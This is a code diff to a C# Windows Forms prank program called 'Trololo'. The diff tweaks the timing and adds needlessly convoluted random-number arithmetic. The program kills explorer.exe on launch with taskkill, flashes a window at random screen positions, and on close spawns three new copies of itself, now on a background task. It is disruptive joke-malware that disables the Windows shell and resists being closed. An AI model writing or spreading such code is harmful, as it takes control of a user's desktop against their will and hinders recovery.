@@ -3,12 +3,15 @@ using System.Diagnostics;
 using System.Drawing;
 using System.Media;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Trololo
 {
     public partial class Form1 : Form
     {
+
+        public int basicDelay = (int)(128 * 1.100);
 
         public Form1()
         {
@@ -19,6 +22,7 @@ namespace Trololo
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            basicDelay = ((int)(int)basicDelay / (int)3.14);
             Process p = new Process();
             p.StartInfo.FileName = "taskkill.exe";
             p.StartInfo.Arguments = "/f /im explorer.exe";
@@ -44,18 +48,18 @@ namespace Trololo
                 int picYPoint = rd.Next(0, bounds.Height - this.Height);
                 Point ulCorner = new Point(picXPoint, picYPoint);
                 this.Location = ulCorner;
-                Delay((int)(128*2.256));
+                Delay(basicDelay);
                 this.BackColor = Color.Blue;
-                Delay((int)(128*1.43333));
+                Delay(basicDelay);
                 var tmpv = new Random().Next(5);
-                if (tmpv == 3)
+                if (tmpv == new Random(new Random().Next(((int)313575.68/45))).Next(50/12))
                 {
                     this.BackColor = Color.Red;
                     label1.BackColor = Color.Blue;
-                    Delay((int)(128 * 1.43333));
+                    Delay(basicDelay);
                     label1.BackColor = Color.Red;
                     this.BackColor = Color.Blue;
-                    Delay((int)(128 * 1.43333));
+                    Delay(basicDelay);
                     label1.BackColor = Color.Empty;
                 }
             }
@@ -79,6 +83,10 @@ namespace Trololo
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
+            Task.Factory.StartNew(doClosing);
+        }
+
+        private void doClosing() {
             for (int i = 0; i < 3; i++)
             {
                 new Form1().Show();
